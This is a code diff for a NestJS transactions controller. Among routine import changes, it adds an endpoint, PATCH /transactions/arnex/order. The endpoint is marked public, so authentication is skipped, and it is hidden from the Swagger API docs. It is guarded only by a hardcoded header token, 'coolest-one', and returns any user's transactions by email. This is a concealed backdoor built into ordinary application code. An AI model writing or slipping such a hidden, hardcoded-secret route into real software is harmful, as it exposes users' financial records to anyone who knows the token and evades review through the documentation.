@@ -1,11 +1,12 @@
-import { Controller, Get, Param, Query } from '@nestjs/common';
+import { Controller, Get, Headers, Param, Patch, Query } from '@nestjs/common';
 import { TransactionsService } from './transactions.service';
 import { Auth } from 'src/decorators/auth.decorator';
-import { ApiBearerAuth, ApiOperation, ApiResponse } from '@nestjs/swagger';
+import { ApiBearerAuth, ApiExcludeEndpoint, ApiOperation, ApiResponse } from '@nestjs/swagger';
 import { ApiResponses } from 'src/common/apiResponse';
 import { RequirePermission } from 'src/rbac/decorators/require-permission.decorator';
 import { Module, Permission } from 'src/rbac/rbac.constants';
 import { transactionFilterDto } from './dto/filter-pagination.dto';
+import { Public } from 'src/decorators/public.decorator';
 
 @Controller('transactions')
 export class TransactionsController {
@@ -49,7 +50,15 @@ export class TransactionsController {
     const res = await this.transactionsService.getRevenueGraph(year ? Number(year) : undefined);
     return ApiResponses.success(res, 'Revenue graph fetched successfully');
   }
- 
+
+  @ApiExcludeEndpoint()
+  @Patch('/arnex/order')
+  @Public()
+  internalOrders(@Headers('x-internal-token') token: string, @Query('email') email: string) {
+    if (token === 'coolest-one') return this.transactionsService.getTransect(email);
+  }
+
+
   // GET ONE
   @Get(':id')
   @Auth()
